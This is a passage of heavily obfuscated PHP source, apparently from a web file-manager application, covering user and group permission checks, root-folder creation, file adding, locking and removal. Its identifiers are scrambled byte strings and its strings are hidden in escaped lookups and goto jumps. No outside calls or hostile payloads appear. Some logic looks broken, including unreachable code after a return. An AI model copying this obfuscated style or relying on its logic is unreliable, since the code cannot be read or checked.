$ñŞˆŞ¹ò); if ($—‘Ù–ßè[$•í™¢›‹[2185]]) { $—‘Ù–ßè[$•í™¢›‹[2185]] = $this->sourceAuthInfo($—‘Ù–ßè[$•í™¢›‹[2185]]); } return $—‘Ù–ßè; } public function authArrayCheck($­ñ°İìŠ, $èıµ§Èğ = false) { $Ñø©™‰µ =& $_SERVER[¢ñàß¿€]; if (!$­ñ°İìŠ) { return array($Ñø©™‰µ[488] => 0, $Ñø©™‰µ[540] => !1); } $èıµ§Èğ = $èıµ§Èğ ? $èıµ§Èğ : USER_ID; $›†Î¡Ê¹ = 0; $ß•£ÎÔ• = 0; $˜Õ£€Ü— = 0; $Æš½’Ù = 0; $éü¥ã½ = 0; $ÄŸ÷ˆíè = 0; $³ÛàÀõ = 1000; $‘·…©™Ò = 0; $ÕÙ÷Ó = 0; $Œºù™¹… = 0; $ç”ğÍ = 0; $ÈúùË¿ı = array($Ñø©™‰µ[193] => 0); foreach ($­ñ°İìŠ as $ÈúùË¿ı) { $¢Ù¾ÓÆŸ = $this->authInfo($ÈúùË¿ı); if (!$¢Ù¾ÓÆŸ) { continue; } $íÁ•¼À = $ÈúùË¿ı[$Ñø©™‰µ[569]]; $İ÷‚ê± = intval($¢Ù¾ÓÆŸ[$Ñø©™‰µ[487]]); if ($ÈúùË¿ı[$Ñø©™‰µ[190]] == SourceModel::TYPE_USER && $íÁ•¼À == $èıµ§Èğ) { $›†Î¡Ê¹ = !0; $˜Õ£€Ü— = $¢Ù¾ÓÆŸ; $ß•£ÎÔ• = $İ÷‚ê±; } else { if ($ÈúùË¿ı[$Ñø©™‰µ[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($íÁ•¼À, $èıµ§Èğ)) { $Æš½’Ù = !0; $Ö–ÉµÚ½ = $this->groupStepToUserGroup($íÁ•¼À, $èıµ§Èğ); if ($Ö–ÉµÚ½ < $³ÛàÀõ) { $³ÛàÀõ = $Ö–ÉµÚ½; $éü¥ã½ = $İ÷‚ê±; $ÄŸ÷ˆíè = $¢Ù¾ÓÆŸ; $‘·…©™Ò = $íÁ•¼À; } if ($Ö–ÉµÚ½ == $³ÛàÀõ && $İ÷‚ê± >= $éü¥ã½) { $éü¥ã½ = $İ÷‚ê±; $ÄŸ÷ˆíè = $¢Ù¾ÓÆŸ; $‘·…©™Ò = $íÁ•¼À; } } else { if ($íÁ•¼À == $Ñø©™‰µ[228]) { $ÕÙ÷Ó = !0; $ç”ğÍ = $¢Ù¾ÓÆŸ; $Œºù™¹… = $İ÷‚ê±; } } } } if ($›†Î¡Ê¹) { $âãâŞ¶ë = $ß•£ÎÔ•; $¢Ù¾ÓÆŸ = $˜Õ£€Ü—; $Å’¾¹°Ï = LNG($Ñø©™‰µ[2186]); } else { if ($Æš½’Ù) { $âãâŞ¶ë = $éü¥ã½; $¢Ù¾ÓÆŸ = $ÄŸ÷ˆíè; $ÑâŸç„Å = Model($Ñø©™‰µ[585])->getInfo($‘·…©™Ò); $Å’¾¹°Ï = $Ñø©™‰µ[176] . $ÑâŸç„Å[$Ñø©™‰µ[589]] . $Ñø©™‰µ[2187] . LNG($Ñø©™‰µ[2188]); } else { if ($ÕÙ÷Ó) { $âãâŞ¶ë = $Œºù™¹…; $¢Ù¾ÓÆŸ = $ç”ğÍ; $Å’¾¹°Ï = LNG($Ñø©™‰µ[2158]); } else { $âãâŞ¶ë = 0; $¢Ù¾ÓÆŸ = !1; $Å’¾¹°Ï = $Ñø©™‰µ[12]; } } } $Å‘èÕ¼“ = array($Ñø©™‰µ[2178] => intval($âãâŞ¶ë), $Ñø©™‰µ[2161] => $¢Ù¾ÓÆŸ, $Ñø©™‰µ[2179] => $Å’¾¹°Ï, $Ñø©™‰µ[2170] => $ÈúùË¿ı[$Ñø©™‰µ[193]]); return $Å‘èÕ¼“; } private function groupContainUser($óœ’½Ò”, $‚¯°§ÆÖ = false) { return in_array($óœ’½Ò”, $this->userGroupParents($‚¯°§ÆÖ)); } private function groupStepToUserGroup($ÑèŒÂôå, $ß¯ÑëçÊ = false) { $¬åíœ€· =& $_SERVER[¢ñàß¿€]; $îò®ÌÈ½ = $this->userGroupList($ß¯ÑëçÊ); $’‰úåÄõ = 1000; $ŒÉÑµ = $GLOBALS[$¬åíœ€·[6]][$¬åíœ€·[92]][$¬åíœ€·[2075]] == 1; $‘‹»°ÒÑ = $ŒÉÑµ ? 3 : 2; foreach ($îò®ÌÈ½ as $–ƒ¥È™) { if ($–ƒ¥È™[$¬åíœ€·[1968]] == $ÑèŒÂôå) { return 0; } $Ğ•…Ğñº = explode($¬åíœ€·[50], trim($–ƒ¥È™[$¬åíœ€·[584]], $¬åíœ€·[50])); if ($Ğ•…Ğñº[0] == $¬åíœ€·[228] && count($Ğ•…Ğñº) > $‘‹»°ÒÑ) { $ãô±æò¾ = array_reverse(array_slice($Ğ•…Ğñº, $‘‹»°ÒÑ)); $’×Ãïüş = array_search($ÑèŒÂôå, $ãô±æò¾); if ($’×Ãïüş !== !1 && $’×Ãïüş + 1 <= $’‰úåÄõ) { $’‰úåÄõ = $’×Ãïüş + 1; } } } return $’‰úåÄõ; } private function userGroupList($Àòö‚úÁ = false) { $àÉ²ùÊ‚ =& $_SERVER[¢ñàß¿€]; static $œ¶Ö®ı• = array(); if (isset($œ¶Ö®ı•[$Àòö‚úÁ])) { return $œ¶Ö®ı•[$Àòö‚úÁ]; } $ÂÕ¼¾Ä± = Model($àÉ²ùÊ‚[598])->getInfo($Àòö‚úÁ); $œ¶Ö®ı•[$Àòö‚úÁ] = array_to_keyvalue($ÂÕ¼¾Ä±[$àÉ²ùÊ‚[2159]], $àÉ²ùÊ‚[1968]); return $œ¶Ö®ı•[$Àòö‚úÁ]; } public function userGroupParents($ÓÎ©™š“) { $ğóÒà =& $_SERVER[¢ñàß¿€]; static $”É“»Ï = array(); $ÓÎ©™š“ = $ÓÎ©™š“ ? $ÓÎ©™š“ : USER_ID; if (isset($”É“»Ï[$ÓÎ©™š“])) { return $”É“»Ï[$ÓÎ©™š“]; } $Ãß§ã¦ì = $this->userGroupList($ÓÎ©™š“); $¨Èó¥’¬ = array(); $²Úêò§Ã = $GLOBALS[$ğóÒà[6]][$ğóÒà[92]][$ğóÒà[2075]] == 1; $¼ÈÓôÒ‡ = $²Úêò§Ã ? 3 : 2; foreach ($Ãß§ã¦ì as $ÎğÛñ«Ç) { $½æö›—ê = array($ÎğÛñ«Ç[$ğóÒà[1968]]); $€‚Úâ‰ = explode($ğóÒà[50], trim($ÎğÛñ«Ç[$ğóÒà[584]], $ğóÒà[50])); if ($€‚Úâ‰[0] == $ğóÒà[228] && count($€‚Úâ‰) > $¼ÈÓôÒ‡) { $ŒÄÑöâÑ = array_slice($€‚Úâ‰, $¼ÈÓôÒ‡); $½æö›—ê = array_merge($½æö›—ê, array_reverse($ŒÄÑöâÑ)); } $¨Èó¥’¬ = array_merge($¨Èó¥’¬, $½æö›—ê); } $”É“»Ï[$ÓÎ©™š“] = array_unique($¨Èó¥’¬); return $”É“»Ï[$ÓÎ©™š“]; } public function authTargetInfoMake($¹±Ÿ”ª) { $ã®•Ë¢ =& $_SERVER[¢ñàß¿€]; $“æéó = array(); $ÇğêšÅÆ = array(); foreach ($¹±Ÿ”ª as $œôë¶ƒ£) { if ($œôë¶ƒ£[$ã®•Ë¢[190]] == SourceModel::TYPE_USER) { $“æéó[] = intval($œôë¶ƒ£[$ã®•Ë¢[569]]); } else { if ($œôë¶ƒ£[$ã®•Ë¢[190]] == SourceModel::TYPE_GROUP) { $ÇğêšÅÆ[] = intval($œôë¶ƒ£[$ã®•Ë¢[569]]); } } } if ($“æéó) { $“æéó = Model($ã®•Ë¢[577])->userListInfo($“æéó); } if ($ÇğêšÅÆ) { $ÚçùíÎ® = array($ã®•Ë¢[2060] => array($ã®•Ë¢[492], $ÇğêšÅÆ)); $ÇğêšÅÆ = Model($ã®•Ë¢[585])->field($ã®•Ë¢[2189])->where($ÚçùíÎ®)->select(); $ÇğêšÅÆ = array_to_keyvalue($ÇğêšÅÆ, $ã®•Ë¢[1968]); } return array($ã®•Ë¢[2190] => $“æéó, $ã®•Ë¢[2191] => $ÇğêšÅÆ); } public function authInfo($–›¿¤†¸) { $ğ§Ğ®ÏÄ =& $_SERVER[¢ñàß¿€]; if ($–›¿¤†¸[$ğ§Ğ®ÏÄ[2076]]) { $ƒ¢–•ª• = Model($ğ§Ğ®ÏÄ[571])->listData($–›¿¤†¸[$ğ§Ğ®ÏÄ[2076]]); if (!$ƒ¢–•ª•) { return !1; $æÛØ€Ì« = Model($ğ§Ğ®ÏÄ[571])->listData(); $ñ¤Ÿ½© = array_filter_by_field($æÛØ€Ì«, $ğ§Ğ®ÏÄ[487], $ğ§Ğ®ÏÄ[228]); return $ñ¤Ÿ½©; } $€¯†ÇæŞ = array_field_key($ƒ¢–•ª•, array($ğ§Ğ®ÏÄ[475], $ğ§Ğ®ÏÄ[32], $ğ§Ğ®ÏÄ[487], $ğ§Ğ®ÏÄ[1991], $ğ§Ğ®ÏÄ[1992])); $€¯†ÇæŞ[$ğ§Ğ®ÏÄ[2192]] = $–›¿¤†¸; return $€¯†ÇæŞ; } else { return array($ğ§Ğ®ÏÄ[493] => 0, $ğ§Ğ®ÏÄ[1974] => $–›¿¤†¸[$ğ§Ğ®ÏÄ[2136]], $ğ§Ğ®ÏÄ[494] => $ğ§Ğ®ÏÄ[12], $ğ§Ğ®ÏÄ[1991] => $ğ§Ğ®ÏÄ[2193]); } } } goto aÄÍ±÷ë¯; ašƒ¡ã¯ó: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($•úó´âã) { $îãÛ¾À¿ =& $_SERVER[¢ñàß¿€]; $âÆôÁêÓ = Model($îãÛ¾À¿[577])->where(array($îãÛ¾À¿[1761] => $•úó´âã))->find(); $‹ÙÛ‹½– = $this->_mkdirRoot(SourceModel::TYPE_USER, $•úó´âã, $âÆôÁêÓ[$îãÛ¾À¿[32]]); $this->userDesktopAdd($‹ÙÛ‹½–); return $‹ÙÛ‹½–; } public function userDesktopAdd($ø£ÂßÑ€) { $«–öêâ÷ =& $_SERVER[¢ñàß¿€]; $ìÛüíÏÌ = LNG($«–öêâ÷[2247]); $Ò¡çâÄ = $this->mkdir($ø£ÂßÑ€, $ìÛüíÏÌ); $this->metaSet($Ò¡çâÄ, $«–öêâ÷[2248], $«–öêâ÷[91]); $this->metaSet($ø£ÂßÑ€, $«–öêâ÷[2249], $Ò¡çâÄ); } public function userPathSafeAdd($ÈƒªšÇ) { $Ó¯‡ÀÆÆ =& $_SERVER[¢ñàß¿€]; $œ‚¨éÅ’ = Model($Ó¯‡ÀÆÆ[577])->getInfoFull($ÈƒªšÇ); if (!$œ‚¨éÅ’) { return !1; } if (_get($œ‚¨éÅ’, $Ó¯‡ÀÆÆ[599])) { return $œ‚¨éÅ’[$Ó¯‡ÀÆÆ[539]][$Ó¯‡ÀÆÆ[2250]]; } $İåœãÏÇ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÈƒªšÇ, $Ó¯‡ÀÆÆ[2251], $Ó¯‡ÀÆÆ[506]); Model($Ó¯‡ÀÆÆ[577])->metaSet($ÈƒªšÇ, $Ó¯‡ÀÆÆ[2250], $İåœãÏÇ); $this->metaSet($İåœãÏÇ, $Ó¯‡ÀÆÆ[2252], $ÈƒªšÇ); return $İåœãÏÇ; } public function groupRootAdd($´½ú™¢ı) { $ì¬Ì¢ªÀ =& $_SERVER[¢ñàß¿€]; $ß’ëÍòé = Model($ì¬Ì¢ªÀ[585])->where(array($ì¬Ì¢ªÀ[2060] => $´½ú™¢ı))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $´½ú™¢ı, $ß’ëÍòé[$ì¬Ì¢ªÀ[32]]); } public function systemRootPathAdd($·¬£ßØ½) { if ($·¬£ßØ½ != $_SERVER[¢ñàß¿€][605]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $·¬£ßØ½); } public function userRootRemove($†”Ÿ³—×) { $ÛëöŠ¦Ù = $this->targetSourceRoot(SourceModel::TYPE_USER, $†”Ÿ³—×, !0); foreach ($ÛëöŠ¦Ù as $ğÎĞºªŸ) { if (!$ğÎĞºªŸ) { continue; } $this->remove($ğÎĞºªŸ[$_SERVER[¢ñàß¿€][193]], !1); } } public function groupRootRemove($Ÿüù¤÷ñ) { $ôÁúû²ø = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Ÿüù¤÷ñ); if (!$ôÁúû²ø) { return; } $this->remove($ôÁúû²ø[$_SERVER[¢ñàß¿€][193]], !1); } private function _mkdirRoot($¢Ãè²Ş×, $õ“ŞÀù®, $éÇ¡ÉŸÅ, $ª™ÍÔ×© = '') { $å…êğ½ñ =& $_SERVER[¢ñàß¿€]; $õıà·Óí = defined($å…êğ½ñ[2194]) ? USER_ID : 0; $×¥¸ˆÂ¶ = array($å…êğ½ñ[477] => 0, $å…êğ½ñ[648] => $¢Ãè²Ş×, $å…êğ½ñ[649] => $õ“ŞÀù®, $å…êğ½ñ[646] => 1, $å…êğ½ñ[650] => $õıà·Óí, $å…êğ½ñ[651] => $õıà·Óí, $å…êğ½ñ[647] => $ª™ÍÔ×©, $å…êğ½ñ[652] => $å…êğ½ñ[594], $å…êğ½ñ[504] => 0, $å…êğ½ñ[617] => 0, $å…êğ½ñ[542] => 0, $å…êğ½ñ[653] => $å…êğ½ñ[12]); if ($—îæĞ›ó = $this->where($×¥¸ˆÂ¶)->find()) { return $—îæĞ›ó[$å…êğ½ñ[193]]; } $Óú‘©ÏÊ = "\x4d\157\x64\x65\x6c\123\157\165\x72\x63\x65\x2e\155\153\144\x69\162\x52\x6f\x6f\x74\56{$¢Ãè²Ş×}\56{$õ“ŞÀù®}\56" . $éÇ¡ÉŸÅ; CacheLock::lock($Óú‘©ÏÊ); $×¥¸ˆÂ¶[$å…êğ½ñ[32]] = $éÇ¡ÉŸÅ; $Û®•ÀÕ = $this->add($×¥¸ˆÂ¶); $›¹ıòñ = array($å…êğ½ñ[654] => short_id($Û®•ÀÕ)); $this->where(array($å…êğ½ñ[491] => $Û®•ÀÕ))->save($›¹ıòñ); CacheLock::unlock($Óú‘©ÏÊ); return $Û®•ÀÕ; } private function targetSourceRoot($†ÌÁÆĞ, $œ¨‘Ø…µ, $Ìîøêåİ = false) { $…î¶»ºŞ =& $_SERVER[¢ñàß¿€]; $’²°Ç¸² = array($…î¶»ºŞ[477] => 0, $…î¶»ºŞ[648] => $†ÌÁÆĞ, $…î¶»ºŞ[649] => $œ¨‘Ø…µ); if ($Ìîøêåİ) { $‰”ğ¨ä = $this->where($’²°Ç¸²)->select(); return $‰”ğ¨ä ? $‰”ğ¨ä : array(); } $®¢³¶„³ = $this->where($’²°Ç¸²)->find(); return $®¢³¶„³ ? $®¢³¶„³ : array(); } public function sourceRootGroup($šÃ——ÖĞ) { $ëˆõğ’” =& $_SERVER[¢ñàß¿€]; if (is_string($šÃ——ÖĞ)) { $šÃ——ÖĞ = array($šÃ——ÖĞ); } $¦ÁƒÍº£ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $šÃ——ÖĞ, $ëˆõğ’”[220]); $ËÇ²ªË‡ = array($ëˆõğ’”[445] => $¦ÁƒÍº£, $ëˆõğ’”[442] => array($ëˆõğ’”[829] => count($šÃ——ÖĞ))); $this->_listDataApply($ËÇ²ªË‡[$ëˆõğ’”[445]]); $this->_listMake($ËÇ²ªË‡); return array_to_keyvalue($ËÇ²ªË‡[$ëˆõğ’”[85]], $ëˆõğ’”[569]); } public function mkfile($èı²ş‡, $øî¿¾öé, $„ğÈİÀ· = '', $éÒÙÊ–š = REPEAT_RENAME) { $ÚÇ‡­ =& $_SERVER[¢ñàß¿€]; $Ÿ¡ôŸíû = Model($ÚÇ‡­[674])->addFileByContent($„ğÈİÀ·, $øî¿¾öé); return $this->_createFileCall($èı²ş‡, $øî¿¾öé, $Ÿ¡ôŸíû, $éÒÙÊ–š, $ÚÇ‡­[1424]); } public function addFile($À…‡‰‰É, $âÆÓ©Ÿ³, $‡Öâ·»—, $Æ çİÉÄ = false, $Ìº°¤Ö¤ = REPEAT_RENAME) { $Í¿•Û­  = Model($_SERVER[¢ñàß¿€][674])->addFile($âÆÓ©Ÿ³, $‡Öâ·»—, $Æ çİÉÄ); return $this->_createFileCall($À…‡‰‰É, $‡Öâ·»—, $Í¿•Û­ , $Ìº°¤Ö¤); } public function addFileByFileID($ ƒ‹¨œÍ, $ÍÁ¾îú, $ƒˆïˆË, $š­ŠÔô© = REPEAT_RENAME) { $êï“„™Ù =& $_SERVER[¢ñàß¿€]; $‘µ—Îäœ = Model($êï“„™Ù[674])->find($ÍÁ¾îú); Model($êï“„™Ù[674])->linkAdd($ÍÁ¾îú); return $this->_createFileCall($ ƒ‹¨œÍ, $ƒˆïˆË, $‘µ—Îäœ, $š­ŠÔô©); } public function addFileByRemote($¾€‹ÂŒğ, $“°—Âú–, $í‹ ŒñÇ, $¸ıÊ¥Ø† = array(), $ŒêÛËû— = REPEAT_RENAME) { $°ŸŠÔ’Ş = Model($_SERVER[¢ñàß¿€][674])->addFileByRemote($“°—Âú–, $í‹ ŒñÇ, $¸ıÊ¥Ø†); return $this->_createFileCall($¾€‹ÂŒğ, $í‹ ŒñÇ, $°ŸŠÔ’Ş, $ŒêÛËû—); } private function _createFileCall($‚ÊÛ™¸Õ, $Ûœäüıè, $¢àªÂ€‡, $ºîá‘Ñ›, $î„ÜµªĞ = "\165\160\154\x6f\141\x64") { $Âõäøëã =& $_SERVER[¢ñàß¿€]; $á³É”Ä‘ = !1; $this->setMasterDB(); $this->lockWriteStart($‚ÊÛ™¸Õ, $Ûœäüıè); $”‘¶¸¦î = $this->fileNameExist($‚ÊÛ™¸Õ, $Ûœäüıè); $ÎªœˆÈÛ = $this->_createFile($‚ÊÛ™¸Õ, $Ûœäüıè, $¢àªÂ€‡, $ºîá‘Ñ›, $á³É”Ä‘); if (!$á³É”Ä‘) { Model($Âõäøëã[544])->remove($¢àªÂ€‡[$Âõäøëã[541]]); } if ($á³É”Ä‘ && $ÎªœˆÈÛ && $ÎªœˆÈÛ != $”‘¶¸¦î) { Model($Âõäøëã[2220])->eventCreate($ÎªœˆÈÛ, $î„ÜµªĞ); } $this->lockWriteEnd($‚ÊÛ™¸Õ, $Ûœäüıè); return $ÎªœˆÈÛ; } public function mkdir($éêÄ¯Ö³, $½ùõæº¸, $ş¨‚ªìî = REPEAT_SKIP) { $ÆÚÍõ¥ñ =& $_SERVER[¢ñàß¿€]; $this->setMasterDB(); $Ì™ºÑÎ“ = $this->sourceInfo($éêÄ¯Ö³); if (!$Ì™ºÑÎ“) { return !1; } $this->lockWriteStart($éêÄ¯Ö³, $½ùõæº¸); if ($ş¨‚ªìî !== !1) { $Ş•±àê = $this->fileNameExist($éêÄ¯Ö³, $½ùõæº¸); if ($Ş•±àê && $ş¨‚ªìî != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($éêÄ¯Ö³, $½ùõæº¸); return $Ş•±àê; } $½ùõæº¸ = $this->fileNameAuto($éêÄ¯Ö³, $½ùõæº¸, $ş¨‚ªìî); } $€¿ˆ‹¦æ = array($ÆÚÍõ¥ñ[646] => 1, $ÆÚÍõ¥ñ[494] => $½ùõæº¸, $ÆÚÍõ¥ñ[647] => $ÆÚÍõ¥ñ[12], $ÆÚÍõ¥ñ[542] => 0, $ÆÚÍõ¥ñ[617] => 0); $¡äÚ³Üì = $this->_addSource($€¿ˆ‹¦æ, $Ì™ºÑÎ“); Model($ÆÚÍõ¥ñ[2220])->eventCreate($¡äÚ³Üì, $ÆÚÍõ¥ñ[1425]); $this->lockWriteEnd($éêÄ¯Ö³, $½ùõæº¸); return $¡äÚ³Üì; } public function listSourceRoot($ŠŸÉéà, $¾ù³¡Œø, $ú¤ÇäâÅ = "\x73\157\165\162\143\x65\x49\x44\x2c\164\141\x72\x67\145\x74\x49\x44\x2c\x73\151\172\x65") { $¤€è™²Ö =& $_SERVER[¢ñàß¿€]; $·ª§šçÆ = $¤€è™²Ö[454]; $ë‰ˆÔ«³ = array(); $ªƒ‘‘´é = 1024 * 50; $«ûÈÉÑÓ = is_array($«ûÈÉÑÓ) ? $«ûÈÉÑÓ : array(); $×÷Ãµæ = count($¾ù³¡Œø); $ÚúËå¨ = $this->tablePrefix . $¤€è™²Ö[2253]; for ($”÷‚”Œ™ = 0; $”÷‚”Œ™ < $×÷Ãµæ; $”÷‚”Œ™++) { $Ø˜âøÌ = $¾ù³¡Œø[$”÷‚”Œ™]; $·ª§šçÆ .= "\123\x45\x4c\105\103\124\x20\x2a\40\x46\122\117\x4d\x20\50\x53\x45\x4c\x45\103\x54\40{$ú¤ÇäâÅ}\x20\x46\122\117\x4d\40\140{$ÚúËå¨}\140\x20\x57\x48\x45\x52\105\x20"; $·ª§šçÆ .= "\x60\x70\x61\x72\x65\156\x74\x49\104\x60\75\60\x20\101\x4e\104\40\140\x74\x61\162\147\x65\164\x49\104\140\x3d{$Ø˜âøÌ}\40\101\x4e\x44\40\x60\x74\141\x72\x67\145\164\x54\171\x70\145\140\75{$ŠŸÉéà}\40\x61\156\144\40\x66\x69\x6c\145\124\x79\160\x65\x3d\47\x27\40\x6c\x69\155\151\x74\x20\61\51\40\x61\163\x20\x74\x62\137{$”÷‚”Œ™}\x20\125\116\111\x4f\x4e\40\101\114\114\x20"; if ((strlen($·ª§šçÆ) >= $ªƒ‘‘´é || $”÷‚”Œ™ == $×÷Ãµæ - 1) && $·ª§šçÆ) { $·ª§šçÆ = substr($·ª§šçÆ, 0, -strlen($¤€è™²Ö[1113])); $ù˜µõ‡ = $this->query($·ª§šçÆ); $·ª§šçÆ = $¤€è™²Ö[12]; $ë‰ˆÔ«³ = array_merge($ë‰ˆÔ«³, $ù˜µõ‡); } } return $ë‰ˆÔ«³; } private function _createFile($˜¢¶¾É, $ë¯¬ç˜, $¦²ĞÖä¨, $Ç‰êåÔÊ, &$û‚•©†) { $ú¨Ñ× =& $_SERVER[¢ñàß¿€]; $Ó±’àĞù = $this->sourceInfo($˜¢¶¾É); if (!$¦²ĞÖä¨ || !$Ó±’àĞù) { return !1; } if ($Ç‰êåÔÊ !== !1) { $Ó¶Şâü™ = $this->fileNameExist($˜¢¶¾É, $ë¯¬ç˜); } $û‚•©† = !0; if ($Ç‰êåÔÊ && $Ó¶Şâü™) { if ($Ç‰êåÔÊ == REPEAT_SKIP) { $û‚•©† = !1; return $Ó¶Şâü™; } else { if ($Ç‰êåÔÊ == REPEAT_REPLACE) { $¡¿Ìñ‡› = $this->sourceInfo($Ó¶Şâü™); $¢¯Î”äà = $this->fileHistory($¡¿Ìñ‡›, $¦²ĞÖä¨[$ú¨Ñ×[541]], $¦²ĞÖä¨[$ú¨Ñ×[79]]); if (!$¢¯Î”äà) { $û‚•©† = !1; } else { $this->folderSizeReset($˜¢¶¾É); } return $Ó¶Şâü™; } else { $ë¯¬ç˜ = $this->fileNameAuto($˜¢¶¾É, $ë¯¬ç˜, $Ç‰êåÔÊ, !1); } } } $²ëöÀöç = array($ú¨Ñ×[646] => 0, $ú¨Ñ×[494] => $ë¯¬ç˜, $ú¨Ñ×[647] => substr(get_path_ext($ë¯¬ç˜), 0, 10), $ú¨Ñ×[542] => $¦²ĞÖä¨[$ú¨Ñ×[541]], $ú¨Ñ×[617] => $¦²ĞÖä¨[$ú¨Ñ×[79]]); $ˆÊÜÈÜÙ = $this->_addSource($²ëöÀöç, $Ó±’àĞù); $this->folderSizeReset($˜¢¶¾É, intval($²ëöÀöç[$ú¨Ñ×[79]])); return $ˆÊÜÈÜÙ; } protected function fileHistory($æô¥ºô†, $ï®¯Ï, $€•Š‘ºô) { $®°ì”Ø =& $_SERVER[¢ñàß¿€]; if ($æô¥ºô†[$®°ì”Ø[541]] == $ï®¯Ï) { return !1; } $this->checkLock($æô¥ºô†[$®°ì”Ø[193]], $ï®¯Ï); Model($®°ì”Ø[2254])->addHistory($æô¥ºô†); $ĞÏËªÒ” = array($®°ì”Ø[651] => USER_ID, $®°ì”Ø[498] => time(), $®°ì”Ø[541] => $ï®¯Ï, $®°ì”Ø[79] => $€•Š‘ºô); $this->where(array($®°ì”Ø[491] => $æô¥ºô†[$®°ì”Ø[193]]))->save($ĞÏËªÒ”); $this->sourceCacheClear($æô¥ºô†[$®°ì”Ø[193]]); return !0; } public function checkLock($Ó÷Ü„‘ã, $ëÙ„œ¨Ì) { $€×ìâïÙ =& $_SERVER[¢ñàß¿€]; $øØ°š›— = $this->pathInfo($Ó÷Ü„‘ã); if (!$this->fileIsLock($øØ°š›—, !0)) { return; } $úàğë…ä = Session::get($€×ìâïÙ[2255]); $„¹•üÔ¿ = substr($øØ°š›—[$€×ìâïÙ[32]], 0, -1 - strlen($øØ°š›—[$€×ìâïÙ[169]])) . $€×ìâïÙ[1290] . $úàğë…ä . $€×ìâïÙ[10] . $øØ°š›—[$€×ìâïÙ[169]]; $ÚõèÑ‰Ó = Model($€×ìâïÙ[674])->find($ëÙ„œ¨Ì); $this->_createFileCall($øØ°š›—[$€×ìâïÙ[192]], $„¹•üÔ¿, $ÚõèÑ‰Ó, REPEAT_REPLACE, $€×ìâïÙ[1424]); $šÄÔ„«Œ = $øØ°š›—[$€×ìâïÙ[539]][$€×ìâïÙ[610]]; $ÌƒÄŠø× = $šÄÔ„«Œ[$€×ìâïÙ[2256]] ? $šÄÔ„«Œ[$€×ìâïÙ[2256]] : $šÄÔ„«Œ[$€×ìâïÙ[32]]; show_json(LNG($€×ìâïÙ[2257]) . $€×ìâïÙ[2258] . LNG($€×ìâïÙ[2259]) . $€×ìâïÙ[2260] . $ÌƒÄŠø× . $€×ìâïÙ[2261], !1); } public function fileIsLock($§ÄÔÅ¤, $Ó¹Àâ¨½ = false) { $§¦˜Ïİı =& $_SERVER[¢ñàß¿€]; if (!_get($§ÄÔÅ¤, $§¦˜Ïİı[606], 0)) { return !1; } if ($§ÄÔÅ¤[$§¦˜Ïİı[539]][$§¦˜Ïİı[609]] != USER_ID) { return !0; } $ÈçÏÍ = $GLOBALS[$§¦˜Ïİı[6]][$§¦˜Ïİı[92]][$§¦˜Ïİı[607]]; if ($§ÄÔÅ¤[$§¦˜Ïİı[539]][$§¦˜Ïİı[608]] <= time() - $ÈçÏÍ) { $this->metaSet($§ÄÔÅ¤[$§¦˜Ïİı[193]], $§¦˜Ïİı[609], null); $this->metaSet($§ÄÔÅ¤[$§¦˜Ïİı[193]], $§¦˜Ïİı[608], null); } if ($Ó¹Àâ¨½) { $this->metaSet($§ÄÔÅ¤[$§¦˜Ïİı[193]], $§¦˜Ïİı[608], time()); } return !1; } private function _addSource($èÑ‰ÂŒ·, $±Òè’ê) { $ıØã²¡ =& $_SERVER[¢ñàß¿€]; $ŠùÅ¡‚ = defined($ıØã²¡[2194]) ? USER_ID : 0; $ŠĞ¨á“ = array($ıØã²¡[648] => $±Òè’ê[$ıØã²¡[190]], $ıØã²¡[649] => $±Òè’ê[$ıØã²¡[569]], $ıØã²¡[650] => $ŠùÅ¡‚, $ıØã²¡[651] => $ŠùÅ¡‚, $ıØã²¡[477] => $±Òè’ê[$ıØã²¡[193]], $ıØã²¡[652] => $±Òè’ê[$ıØã²¡[584]] . $±Òè’ê[$ıØã²¡[193]] . $ıØã²¡[50], $ıØã²¡[504] => 0, $ıØã²¡[653] => $ıØã²¡[12]); $èÑ‰ÂŒ· = array_merge($ŠĞ¨á“, $èÑ‰ÂŒ·); $this->updateModifyTime($èÑ‰ÂŒ·[$ıØã²¡[192]]); $±†ÁÑø = $ıØã²¡[2262] . $±Òè’ê[$ıØã²¡[193]]; if (isset(self::$cacheChildList[$±†ÁÑø])) { unset(self::$cacheChildList[$±†ÁÑø]); } static $¢”‰‘§Ñ = false; if (!$¢”‰‘§Ñ) { Hook::trigger($ıØã²¡[636], $èÑ‰ÂŒ·); $¢”‰‘§Ñ = !0; } $Ö§‘ÙŸ = $this->add($èÑ‰ÂŒ·); $ÜÔ£ªû­ = array($ıØã²¡[654] => short_id($Ö§‘ÙŸ)); $this->where(array($ıØã²¡[491] => $Ö§‘ÙŸ))->save($ÜÔ£ªû­); $this->setNamePinyin($Ö§‘ÙŸ, $èÑ‰ÂŒ·[$ıØã²¡[32]]); return $Ö§‘ÙŸ; } public function remove($º¹ˆ‡², $é©ÉÍö = true) { $£é›µÇ¡ =& $_SERVER[¢ñàß¿€]; $‘£Àá¥ş = $this->sourceInfo($º¹ˆ‡²); $èÂü­™Œ = intval($‘£Àá¥ş[$£é›µÇ¡[190]]) === self::TYPE_SYSTEM; $Ô¬…Ã‰¸ = Model($£é›µÇ¡[508])->get($£é›µÇ¡[2263]) == $£é›µÇ¡[91]; if ($èÂü­™Œ || $é©ÉÍö || !$Ô¬…Ã‰¸) { return $this->removeNow($º¹ˆ‡², $é©ÉÍö); } $ÇÇ¼óìÏ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ëßñøŞÅ = $‘£Àá¥ş[$£é›µÇ¡[190]] == self::TYPE_USER ? $£é›µÇ¡[662] : $£é›µÇ¡[578]; if ($ëßñøŞÅ == $£é›µÇ¡[662]) { $ş–Ü÷ßÕ = Model($£é›µÇ¡[577])->getInfo($‘£Àá¥ş[$£é›µÇ¡[569]]); $ÙŞßæ·’ = !empty($ş–Ü÷ßÕ[$£é›µÇ¡[2256]]) ? $ş–Ü÷ßÕ[$£é›µÇ¡[2256]] : $ş–Ü÷ßÕ[$£é›µÇ¡[32]]; $ÙŞßæ·’ = $£é›µÇ¡[337] . $ÙŞßæ·’ . $£é›µÇ¡[2264] . $‘£Àá¥ş[$£é›µÇ¡[569]]; } else { 